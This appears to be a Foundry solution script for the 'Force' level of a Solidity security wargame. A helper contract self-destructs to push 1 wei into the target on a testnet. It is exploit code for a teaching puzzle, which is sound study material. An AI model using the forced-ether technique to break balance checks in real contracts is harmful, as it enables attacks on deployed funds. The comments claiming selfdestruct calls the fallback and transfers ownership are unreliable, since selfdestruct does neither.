// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level7Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: The goal of this level is to make the balance of the contract greater than zero.

contract Player {
    Force public force;

    constructor(address _force) payable {
        force = Force(_force);
    }

    function claimOwnership() public {
        // This will call the Force contract's fallback function
        // and transfer the ownership to this contract.
        selfdestruct(payable(address(force)));
    }
}

contract Level7Solution is Script {
    Force public force = Force(0x964f2Bf6183F2d999b83296929700ba6b333E50E);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            "Current balance of Force contract:",
            address(force).balance
        );
        Player player = new Player{value: 1}(address(force));
        player.claimOwnership();
        console.log("New balance of Force contract:", address(force).balance);

        vm.stopBroadcast();
    }
}
// forge script script/Level7Solution.s.sol:Level7Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
